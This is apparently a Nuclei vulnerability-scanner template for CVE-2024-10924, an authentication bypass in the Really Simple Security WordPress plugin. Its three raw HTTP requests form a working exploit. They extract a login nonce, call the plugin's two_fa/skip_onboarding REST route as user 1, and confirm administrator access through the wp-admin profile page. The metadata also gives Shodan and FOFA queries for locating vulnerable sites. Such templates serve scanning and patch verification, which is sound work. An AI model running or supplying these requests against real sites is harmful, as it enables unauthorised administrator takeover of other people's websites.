flow: http(1) && http(2) && http(3)
http:
- extractors:
  - group: 1
    internal: true
    name: nonce
    part: body_1
    regex:
    - '"nonce":"([a-z0-9]+)"\}'
    type: regex
  raw:
  - 'GET /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - internal: true
    part: body
    type: word
    words:
    - '"redirect_to":"\/wp-admin\/"'
  raw:
  - "POST /?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding HTTP/1.1\nHost:\
    \ {{Hostname}}\nContent-Type: application/json\n\n{\n    \"user_id\": 1,\n   \
    \ \"login_nonce\": \"{{nonce}}\",\n    \"redirect_to\": \"/wp-admin/\"\n}\n"
- matchers:
  - part: body
    type: word
    words:
    - Personal Options
  - part: content_type
    type: word
    words:
    - text/html
  matchers-condition: and
  raw:
  - 'GET /wp-admin/profile.php HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-10924
info:
  author: yaser_s
  classification:
    cpe: cpe:2.3:a:really-simple-plugins:really_simple_security:*:*:*:*:-:wordpress:*:*
    cve-id: CVE-2024-10924
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-288,CWE-306
    epss-percentile: 0.99825
    epss-score: 0.93628
  description: 'The Really Simple Security (Free, Pro, and Pro Multisite) plugins
    for WordPress are vulnerable to authentication bypass in versions 9.0.0 to 9.1.1.1.
    This is due to improper user check error handling in the two-factor REST API actions
    with the ''check_login_and_get_user'' function. This makes it possible for unauthenticated
    attackers to log in as any existing user on the site, such as an administrator,
    when the "Two-Factor Authentication" setting is enabled (disabled by default).

    '
  impact: 'Unauthenticated attackers can exploit improper error handling in the two-factor
    authentication REST API to bypass authentication and log in as any user including
    administrators when two-factor authentication is enabled.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/really-simple-ssl"
    framework: wordpress
    max-request: 1
    product: really_simple_security
    shodan-query: html:"/wp-content/plugins/really-simple-ssl"
    vendor: really-simple-plugins
    verified: true
  name: Really Simple Security < 9.1.2 - Authentication Bypass
  reference:
  - https://plugins.trac.wordpress.org/browser/really-simple-ssl/tags/9.1.1.1/security/wordpress/two-fa/class-rsssl-two-factor-on-board-api.php#L277
  - https://plugins.trac.wordpress.org/browser/really-simple-ssl/tags/9.1.1.1/security/wordpress/two-fa/class-rsssl-two-factor-on-board-api.php#L278
  - https://plugins.trac.wordpress.org/browser/really-simple-ssl/tags/9.1.1.1/security/wordpress/two-fa/class-rsssl-two-factor-on-board-api.php#L67
  - https://plugins.trac.wordpress.org/changeset/3188431/really-simple-ssl
  - https://wpscan.com/vulnerability/8e1f4374-2e41-4c27-80d4-db172015c6be/
  - https://www.wordfence.com/threat-intel/vulnerabilities/id/7d5d05ad-1a7a-43d2-bbbf-597e975446be?source=cve
  - https://nvd.nist.gov/vuln/detail/CVE-2024-10924
  remediation: Fixed in 9.1.2
  severity: critical
  tags: cve,cve2024,wp,wp-plugin,wordpress,auth-bypass,really-simple-ssl,vkev,vuln
